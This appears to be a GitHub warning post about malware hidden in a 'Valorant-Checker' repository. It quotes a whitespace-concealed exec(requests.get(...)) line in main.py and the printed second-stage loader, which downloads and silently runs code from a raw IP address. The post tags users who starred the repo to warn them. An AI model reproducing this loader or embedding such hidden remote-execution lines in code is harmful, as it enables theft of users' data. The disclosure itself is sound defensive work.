`main.py` file:

https://github.com/Yosh1m/Valorant-Checker/blob/186fabf7e6f9122ea6fefc695f945a09dfcfeb8e/main.py#L2

```
import os                                                                                                                                
import requests  ..... lots of whitespace..... ;exec(requests.get('https://rentry.co/f5qhqqb4/raw').text)  
```

Contents of https://rentry.co/f5qhqqb4/raw 

```
import subprocess
from tempfile import NamedTemporaryFile as tempnaw
from os import system as syast
py_execs = ["pythonw", "pyw", "py"]
for py_exec in py_execs:
    try:
        subprocess.run([py_exec, "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        break
    except FileNotFoundError:
        continue
else:
    py_exec = "python"
temp_file = tempnaw(delete=False)
temp_file.write(b"""exec(__import__('requests').get('http://162.248.100.117/inj', headers={'User-Agent': 'Mozilla/5.0 (CyberW / Python) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30'}).text)""")
temp_file.close()
try:
    syast(f"start {py_exec} {temp_file.name}")
except:
    pass
```


This runs a malware that steals all your info and details.
More details on the malware: https://medium.com/@demonia/lets-dig-deep-into-pypihosted-malware-part-1-94ada4737442

@jerxcho, @Swaggill, @zabbix-byte, @SwagaDevv, @RendyHafizt, @voxa4141, @ekole123421, @Matthew2007-dev, @mehmetali1446, @PacharaXx, @romisrebel, @alvi7723, @wind1l, @AhmedAtiaat3eto, @prajan1313, @Kaafu, @moradFCB, @KirtM25, @duylut, @Ichsanrw, @abulnur, @Lolyy123, @allthingks4, @AmandaRanolds, @Howardconnor55, @Jjwass, @teezak007, @huberceros577, @Mahmoud4567, @cgorgio19, @akiimrgt, @Putaly, @mohamed256341, @shahd256341, @husain4044, @moksmdo1, @hosneymohamed676, @happisam27, @abdullahelmilady, @ANDREWMAYA1, @t43g, @mohammedgit12, @omaralimohamed1979, @omniyamohamed09, @youssefmooo, @zZOmar, @mohamedahemd633, @Gunner8000, @Mohamedsalem223, @beatsbyluca999, @sumitmaurya021, 

You guys have stared this repo, be careful.